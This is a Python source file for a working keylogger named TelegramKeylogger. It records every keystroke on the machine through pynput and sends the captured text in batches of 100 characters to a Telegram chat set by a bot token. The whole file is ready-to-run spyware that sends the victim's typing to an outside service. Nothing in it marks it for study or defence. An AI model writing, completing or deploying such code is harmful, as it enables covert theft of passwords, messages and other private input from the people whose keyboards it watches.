import pynput.keyboard
from telegram import Bot
from telegram.constants import ParseMode
import datetime
import asyncio
import threading

class TelegramKeylogger:
    def __init__(self, api_token, chat_id):
        self.bot = Bot(api_token)
        self.chat_id = chat_id
        self.buffer = []  
        self.buffer_limit = 100
        self.lock = threading.Lock()  
        
        # ✅ Create a single event loop for Telegram messages
        self.loop = asyncio.new_event_loop()
        self.thread = threading.Thread(target=self.start_loop, daemon=True)
        self.thread.start()

    def start_loop(self):
        """Runs the event loop in a separate thread."""
        asyncio.set_event_loop(self.loop)
        self.loop.run_forever()

    def send_to_telegram_sync(self, message):
        """Uses the single event loop to send messages asynchronously."""
        asyncio.run_coroutine_threadsafe(self.send_to_telegram(message), self.loop)

    async def send_to_telegram(self, message):
        """Sends the message to Telegram with HTML formatting (avoiding Markdown errors)."""
        try:
            # ✅ Escape special characters to prevent Markdown errors
            safe_message = message.replace("<", "&lt;").replace(">", "&gt;").replace("&", "&amp;")
            await self.bot.send_message(chat_id=self.chat_id, text=safe_message, parse_mode=ParseMode.HTML)
        except Exception as e:
            print(f"Error sending message to Telegram: {e}")

    def evaluate_keys(self, key):
        try:
            pressed_key = str(key.char)
        except AttributeError:
            if key == pynput.keyboard.Key.space:
                pressed_key = " "
            elif key == pynput.keyboard.Key.enter:
                pressed_key = "\n"
            else:
                pressed_key = f" {str(key)} "

        with self.lock:
            self.buffer.append(pressed_key)
            if len(self.buffer) >= self.buffer_limit:
                message = "".join(self.buffer)
                self.buffer = []  

                # ✅ Send message using a single event loop
                self.send_to_telegram_sync(message)

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.evaluate_keys)
        with keyboard_listener:
            keyboard_listener.join()

if __name__ == "__main__":
    api_token = 'YOUR_BOT_TOKEN'
    chat_id = 'CHAT_ID'
    TelegramKeylogger(api_token, chat_id).start()
